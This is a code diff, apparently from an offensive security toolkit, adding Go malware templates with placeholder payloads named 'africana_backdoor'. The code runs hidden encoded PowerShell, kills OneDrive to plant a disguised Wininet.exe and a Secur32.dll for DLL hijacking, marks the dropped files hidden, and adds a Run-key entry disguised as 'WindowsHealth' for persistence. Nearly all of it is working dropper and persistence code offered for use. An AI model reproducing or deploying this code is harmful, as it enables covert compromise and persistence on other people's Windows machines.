@@ -1267,82 +1267,262 @@ do {
 } while ($true)
 
 
-#include<windows.h>
-#include<string.h>
-#include<stdio.h>
-
-int main() {
-
-      system("");
-      return 0;
-}
 
 
 package main
 
 import (
     "syscall"
+    "unsafe"
 )
 
 func main() {
-    // Direct Win32 API call
-    procInfo := syscall.ProcessInformation{}
-    startupInfo := syscall.StartupInfo{}
+    var procInfo syscall.ProcessInformation
+    startupInfo := syscall.StartupInfo{Cb: uint32(unsafe.Sizeof(syscall.StartupInfo{}))}
 
-    commandLine := syscall.StringToUTF16Ptr("powershell.exe -WindowStyle Hidden -Enc \"    \"")
+    encodedCommand := "africana_backdoor"
+
+    cmd := "powershell.exe -WindowStyle Hidden -Enc " + encodedCommand
+    commandLine, _ := syscall.UTF16PtrFromString(cmd)
 
     syscall.CreateProcess(
-        nil,               // Application name
-        commandLine,       // Command line
-        nil,               // Process security attributes
-        nil,               // Thread security attributes
-        false,             // Inherit handles
-        0x08000000,        // CREATE_NO_WINDOW flag
-        nil,               // Environment
-        nil,               // Current directory
-        &startupInfo,      // Startup info
-        &procInfo,         // Process info
+        nil,
+        commandLine,
+        nil,
+        nil,
+        false,
+        0x08000000,
+        nil,
+        nil,
+        &startupInfo,
+        &procInfo,
     )
+
+    syscall.CloseHandle(procInfo.Process)
+    syscall.CloseHandle(procInfo.Thread)
 }
+
+
+
+
+
 
 
 package main
 
 import (
-        "syscall"
-        "unsafe"
+    "os"
+    "time"
+    "unsafe"
+    "syscall"
+    "path/filepath"
+    "encoding/base64"
 )
 
-func main() {
-        var procInfo syscall.ProcessInformation
-        startupInfo := syscall.StartupInfo{Cb: uint32(unsafe.Sizeof(syscall.StartupInfo{}))}
+var (
+    kernel32 = syscall.NewLazyDLL("kernel32.dll")
+)
 
-        // 1. Replace with REAL Base64-encoded PowerShell command
-        // Example: "Write-Output 'test'" → "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAHQAZQBzAHQAIgA="
-        encodedCommand := "" // Must be valid Base64
+const (
+    CREATE_NO_WINDOW = 0x08000000
+)
 
-        // 2. Correctly format the command line (no %s, direct concatenation)
-        cmd := "powershell.exe -WindowStyle Hidden -Enc " + encodedCommand
-        commandLine, _ := syscall.UTF16PtrFromString(cmd)
+func executeHidden(path string) {
+    var si syscall.StartupInfo
+    var pi syscall.ProcessInformation
+    si.Cb = uint32(unsafe.Sizeof(si))
+    si.Flags = syscall.STARTF_USESHOWWINDOW
+    si.ShowWindow = syscall.SW_HIDE
 
-        // 3. Execute silently (no window, no errors)
-        syscall.CreateProcess(
-                nil,
-                commandLine,
-                nil,
-                nil,
-                false,
-                0x08000000, // CREATE_NO_WINDOW flag
-                nil,
-                nil,
-                &startupInfo,
-                &procInfo,
-        )
-
-        // 4. Avoid handle leaks (no defer, immediate close)
-        syscall.CloseHandle(procInfo.Process)
-        syscall.CloseHandle(procInfo.Thread)
+    pathPtr, _ := syscall.UTF16PtrFromString(path)
+    kernel32.NewProc("CreateProcessW").Call(
+        0,
+        uintptr(unsafe.Pointer(pathPtr)),
+        0,
+        0,
+        0,
+        CREATE_NO_WINDOW,
+        0,
+        0,
+        uintptr(unsafe.Pointer(&si)),
+        uintptr(unsafe.Pointer(&pi)),
+    )
 }
+
+func setHidden(path string) {
+    pathPtr, _ := syscall.UTF16PtrFromString(path)
+    kernel32.NewProc("SetFileAttributesW").Call(
+        uintptr(unsafe.Pointer(pathPtr)),
+        syscall.FILE_ATTRIBUTE_HIDDEN,
+    )
+}
+
+func killProcess(name string) {
+    cmd := "taskkill /im " + name + " /f"
+    cmdPtr, _ := syscall.UTF16PtrFromString(cmd)
+    kernel32.NewProc("WinExec").Call(
+        uintptr(unsafe.Pointer(cmdPtr)),
+        uintptr(0),
+    )
+}
+
+func main() {
+    exeData, _ := base64.StdEncoding.DecodeString("africana_backdoor_e")
+    dllData, _ := base64.StdEncoding.DecodeString("africana_backdoor_d")
+
+    exePath := filepath.Join(os.Getenv("ProgramData"), "Wininet.exe")
+    dllPath := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local", "Microsoft", "OneDrive", "Secur32.dll")
+
+    killProcess("OneDrive.exe")
+    killProcess("Wininet.exe")
+    time.Sleep(1 * time.Second)
+    os.Remove(exePath)
+    os.Remove(dllPath)
+    time.Sleep(1 * time.Second)
+
+    os.WriteFile(exePath, exeData, 0644)
+    os.WriteFile(dllPath, dllData, 0644)
+
+    setHidden(exePath)
+    setHidden(dllPath)
+
+    oneDrivePath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "OneDrive", "OneDrive.exe")
+    executeHidden(oneDrivePath)
+}
+
+
+
+
+
+package main
+
+import (
+    "os"
+    "unsafe"
+    "syscall"
+    "path/filepath"
+    "encoding/base64"
+)
+
+var (
+    kernel32 = syscall.NewLazyDLL("kernel32.dll")
+    advapi32 = syscall.NewLazyDLL("advapi32.dll")
+)
+
+const (
+    KEY_SET_VALUE    = 0x0002
+    KEY_QUERY_VALUE  = 0x0001
+    KEY_ALL_ACCESS   = 0xF003F
+    REG_SZ           = 1
+    CREATE_NO_WINDOW = 0x08000000
+)
+
+func executeHidden(path string) bool {
+    var si syscall.StartupInfo
+    var pi syscall.ProcessInformation
+    si.Cb = uint32(unsafe.Sizeof(si))
+    si.Flags = syscall.STARTF_USESHOWWINDOW
+    si.ShowWindow = syscall.SW_HIDE
+
+    pathPtr, _ := syscall.UTF16PtrFromString(path)
+    ret, _, _ := kernel32.NewProc("CreateProcessW").Call(
+        0,
+        uintptr(unsafe.Pointer(pathPtr)),
+        0,
+        0,
+        0,
+        CREATE_NO_WINDOW,
+        0,
+        0,
+        uintptr(unsafe.Pointer(&si)),
+        uintptr(unsafe.Pointer(&pi)),
+    )
+
+    if ret == 0 {
+        return false
+    }
+
+    syscall.CloseHandle(syscall.Handle(pi.Process))
+    syscall.CloseHandle(syscall.Handle(pi.Thread))
+    return true
+}
+
+func deleteRegistryKey(valueName string) {
+    regKey := `Software\Microsoft\Windows\CurrentVersion\Run`
+
+    var hKey uintptr
+    RegOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
+    ret, _, _ := RegOpenKeyEx.Call(
+        uintptr(0x80000001),
+        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(regKey))),
+        0,
+        uintptr(KEY_ALL_ACCESS),
+        uintptr(unsafe.Pointer(&hKey)),
+    )
+
+    if ret != 0 {
+        return
+    }
+    defer syscall.CloseHandle(syscall.Handle(hKey))
+
+    RegDeleteValue := advapi32.NewProc("RegDeleteValueW")
+    RegDeleteValue.Call(
+        hKey,
+        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(valueName))),
+    )
+}
+
+func addRegistryPersistence(targetPath string) {
+    regKey := `Software\Microsoft\Windows\CurrentVersion\Run`
+    valueName := "WindowsHealth"
+
+    deleteRegistryKey(valueName)
+
+    var hKey uintptr
+    RegOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
+    ret, _, _ := RegOpenKeyEx.Call(
+        uintptr(0x80000001),
+        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(regKey))),
+        0,
+        uintptr(KEY_SET_VALUE),
+        uintptr(unsafe.Pointer(&hKey)),
+    )
+
+    if ret != 0 {
+        return
+    }
+    defer syscall.CloseHandle(syscall.Handle(hKey))
+
+    RegSetValueEx := advapi32.NewProc("RegSetValueExW")
+    RegSetValueEx.Call(
+        hKey,
+        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(valueName))),
+        0,
+        uintptr(REG_SZ),
+        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(targetPath))),
+        uintptr((len(targetPath)+1)*2),
+    )
+}
+
+func main() {
+    payload, _ := base64.StdEncoding.DecodeString("africana_backdoor_e")
+    targetPath := filepath.Join(os.Getenv("ProgramData"), "Wininet.exe")
+
+    os.MkdirAll(filepath.Dir(targetPath), 0755)
+    os.WriteFile(targetPath, payload, 0644)
+
+    syscall.Syscall(
+        kernel32.NewProc("SetFileAttributesW").Addr(),
+        2,
+        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(targetPath))),
+        syscall.FILE_ATTRIBUTE_HIDDEN,
+        0,
+    )
+
+    executeHidden(targetPath)
+    addRegistryPersistence(targetPath)
+}
+
 
 +------------------------------------------------------------------------------+
 |                          Dll Hijack  svchost.exe  Secur32.dll                |
